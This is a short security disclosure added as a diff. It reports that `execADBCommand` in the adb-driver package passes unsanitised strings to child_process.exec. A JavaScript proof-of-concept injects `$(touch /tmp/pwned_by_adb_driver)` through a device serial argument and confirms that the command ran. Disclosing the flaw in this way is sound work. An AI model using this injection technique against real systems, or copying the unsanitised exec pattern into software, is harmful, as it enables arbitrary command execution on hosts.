@@ -1,0 +1,19 @@
+Confirmed: `execADBCommand` in `build/AdbDriver.js` passes an unsanitized command string directly to `child_process.exec`, allowing shell command injection via typical inputs like a device serial (`adb -s <serial> shell ...`).
+
+```javascript
+const { execADBCommand } = require("adb-driver");
+
+// Simulates an app building an adb command from user-controlled input
+// (e.g. a device serial number or file path) without sanitization.
+const userControlledSerial = "$(touch /tmp/pwned_by_adb_driver)";
+
+execADBCommand(`adb -s ${userControlledSerial} get-state`)
+  .then(() => {
+    const fs = require("fs");
+    console.log(
+      "Injected command executed:",
+      fs.existsSync("/tmp/pwned_by_adb_driver")
+    );
+  })
+  .catch(err => console.error(err));
+```
